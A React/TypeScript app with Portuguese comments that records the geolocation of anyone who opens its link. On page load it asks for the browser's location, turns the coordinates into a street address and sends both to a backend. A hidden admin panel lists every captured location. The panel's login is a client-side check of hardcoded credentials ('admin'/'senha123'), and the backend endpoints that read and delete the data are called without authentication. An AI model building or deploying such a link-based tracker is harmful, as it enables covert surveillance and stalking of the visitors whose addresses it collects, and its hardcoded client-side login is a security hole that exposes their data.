import React, { useState, useEffect } from 'react';
import axios from 'axios';

interface Location {
  latitude: number | null;
  longitude: number | null;
  country: string | null;
  city: string | null;
  address: string | null;
  placeName: string | null;
  error: string | null;
  loading: boolean;
}

const App: React.FC = () => {
  const [location, setLocation] = useState<Location>({
    latitude: null,
    longitude: null,
    country: null,
    city: null,
    address: null,
    placeName: null,
    error: null,
    loading: false,
  });

  const [isAdmin, setIsAdmin] = useState<boolean>(false);
  const [username, setUsername] = useState<string>('');
  const [password, setPassword] = useState<string>('');
  const [showLogin, setShowLogin] = useState<boolean>(false);
  const [locations, setLocations] = useState<any[]>([]);

  // URL do backend atualizado
  const BACKEND_URL = 'https://seu-backend.com'; // Substitua pelo domínio público do backend

  // Função para salvar a localização no banco de dados
  const saveLocationToDatabase = async (locationData: Location) => {
    try {
      const response = await axios.post(`${BACKEND_URL}/save-location`, locationData);
      console.log('Localização salva:', response.data);

      // Adiciona a nova localização ao estado existente
      setLocations((prevLocations) => [...prevLocations, locationData]);
    } catch (error) {
      console.error('Erro ao salvar a localização no banco de dados:', error);
    }
  };

  // Função para obter detalhes de localização com base na latitude e longitude
  const getLocationDetails = async (latitude: number, longitude: number) => {
    try {
      const response = await fetch(
        `https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&accept-language=pt-BR`
      );
      const data = await response.json();
      return {
        country: data.address.country,
        city: data.address.city || data.address.town || data.address.village,
        address: data.display_name,
        placeName: data.address.road || 'Local desconhecido',
      };
    } catch (error) {
      console.error('Erro ao obter detalhes da localização:', error);
      return null;
    }
  };

  // Função para detectar a localização do usuário
  const detectLocation = () => {
    setLocation((prev) => ({ ...prev, loading: true }));

    if ('geolocation' in navigator) {
      navigator.geolocation.getCurrentPosition(
        async (position) => {
          const details = await getLocationDetails(
            position.coords.latitude,
            position.coords.longitude
          );

          const newLocation: Location = {
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            country: details?.country || null,
            city: details?.city || null,
            address: details?.address || null,
            placeName: details?.placeName || null,
            error: null,
            loading: false,
          };

          setLocation(newLocation);
          saveLocationToDatabase(newLocation); // Salva automaticamente a localização
        },
        (error) => {
          setLocation({
            latitude: null,
            longitude: null,
            country: null,
            city: null,
            address: null,
            placeName: null,
            error: 'Por favor, permita o acesso à localização para ver suas coordenadas.',
            loading: false,
          });
        }
      );
    } else {
      setLocation({
        latitude: null,
        longitude: null,
        country: null,
        city: null,
        address: null,
        placeName: null,
        error: 'Geolocalização não é suportada pelo seu navegador.',
        loading: false,
      });
    }
  };

  // Função para obter todas as localizações do banco de dados
  const fetchLocationsFromDatabase = async () => {
    try {
      const response = await axios.get(`${BACKEND_URL}/locations`);
      setLocations(response.data);
    } catch (error) {
      console.error('Erro ao buscar localizações salvas:', error);
    }
  };

  // Função para limpar as localizações do banco de dados
  const clearLocations = async () => {
    try {
      const response = await axios.delete(`${BACKEND_URL}/locations`);
      if (response.status === 200) {
        setLocations([]); // Limpa o estado das localizações
        alert('Localizações limpas com sucesso!');
      }
    } catch (error) {
      console.error('Erro ao limpar localizações:', error);
      alert('Erro ao limpar as localizações.');
    }
  };

  // Função para gerar uma localização simulada
  const generateLocation = async () => {
    const simulatedLocation: Location = {
      latitude: 40.7128,
      longitude: -74.0060,
      country: 'Estados Unidos',
      city: 'Nova York',
      address: 'Times Square, Nova York, NY, EUA',
      placeName: 'Times Square',
      error: null,
      loading: false,
    };

    await saveLocationToDatabase(simulatedLocation);
    alert('Localização gerada e salva no banco de dados!');
    fetchLocationsFromDatabase(); // Recarrega as localizações
  };

  // Usado para detectar a localização do usuário ao carregar o componente
  useEffect(() => {
    // Detecta e salva a localização do visitante ao acessar o link
    const saveVisitorLocation = async () => {
      if ('geolocation' in navigator) {
        navigator.geolocation.getCurrentPosition(
          async (position) => {
            try {
              const details = await getLocationDetails(
                position.coords.latitude,
                position.coords.longitude
              );

              const visitorLocation: Location = {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                country: details?.country || null,
                city: details?.city || null,
                address: details?.address || null,
                placeName: details?.placeName || null,
                error: null,
                loading: false,
              };

              await saveLocationToDatabase(visitorLocation); // Salva a localização no banco de dados
            } catch (error) {
              console.error('Erro ao salvar a localização do visitante:', error);
            }
          },
          (error) => {
            console.error('Erro ao obter localização do visitante:', error);
          }
        );
      } else {
        console.error('Geolocalização não é suportada pelo navegador.');
      }
    };

    saveVisitorLocation(); // Chama a função para salvar a localização do visitante

    if (isAdmin) {
      fetchLocationsFromDatabase(); // Se for admin, busca as localizações salvas
    }
  }, [isAdmin]);

  useEffect(() => {
    // Carrega as localizações salvas ao montar o componente
    const loadLocations = async () => {
      try {
        const response = await axios.get(`${BACKEND_URL}/locations`);
        setLocations(response.data); // Atualiza o estado com as localizações salvas
      } catch (error) {
        console.error('Erro ao carregar localizações:', error);
      }
    };

    loadLocations(); // Chama a função para carregar as localizações
  }, []);

  // Função para login
  const handleLogin = (event: React.FormEvent) => {
    event.preventDefault();
    if (username === 'admin' && password === 'senha123') {
      setIsAdmin(true);
      setShowLogin(false); // Esconde o formulário de login após o login com sucesso
    } else {
      alert('Credenciais inválidas');
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-50 to-indigo-100 flex items-center justify-center p-4">
      <div className="bg-white rounded-2xl shadow-xl p-8 max-w-md w-full mx-auto">
        {/* Login */}
        {!isAdmin && !showLogin && (
          <div className="absolute top-4 right-4">
            <button onClick={() => setShowLogin(true)} className="text-blue-600 hover:text-blue-800 font-semibold">
              Fazer Login
            </button>
          </div>
        )}

        {showLogin && !isAdmin && (
          <div>
            <h1 className="text-2xl font-bold text-center text-gray-800 mb-2">Login</h1>
            <form onSubmit={handleLogin}>
              <div className="space-y-4">
                <input
                  type="text"
                  placeholder="Usuário"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  className="w-full p-2 border border-gray-300 rounded"
                />
                <input
                  type="password"
                  placeholder="Senha"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="w-full p-2 border border-gray-300 rounded"
                />
                <button type="submit" className="w-full py-2 bg-blue-600 text-white rounded hover:bg-blue-700">
                  Entrar
                </button>
              </div>
            </form>
          </div>
        )}

        {/* Exibe localização para admins */}
        {isAdmin && (
          <div>
            <h1 className="text-2xl font-bold text-center text-gray-800 mb-4">Administração de Localizações</h1>
            <div className="flex justify-between items-center mb-4">
              <button
                onClick={clearLocations}
                className="py-2 px-4 bg-red-600 text-white rounded hover:bg-red-700"
              >
                Limpar Localizações
              </button>
              <button
                onClick={generateLocation}
                className="py-2 px-4 bg-green-600 text-white rounded hover:bg-green-700"
              >
                Gerar Localização
              </button>
            </div>

            <div className="space-y-4">
              {locations.length > 0 ? (
                locations.map((loc, index) => (
                  <div key={index} className="bg-gray-50 rounded-lg p-4 shadow-md">
                    <p className="font-semibold text-gray-800">
                      {loc.city || 'Cidade não disponível'}, {loc.country || 'País não disponível'}
                    </p>
                    <p className="text-gray-600">{loc.address || 'Endereço não disponível'}</p>
                    <p className="text-gray-600">{loc.placeName || 'Nome do lugar não disponível'}</p>
                    <p className="text-sm text-gray-500">
                      {loc.latitude}°, {loc.longitude}°
                    </p>
                    <p className="text-xs text-gray-400">
                      <small>{new Date(loc.timestamp).toLocaleString()}</small>
                    </p>
                  </div>
                ))
              ) : (
                <p className="text-center text-gray-500">Sem localizações salvas ainda.</p>
              )}
            </div>
          </div>
        )}
      </div>
    </div>
  );
};

export default App;
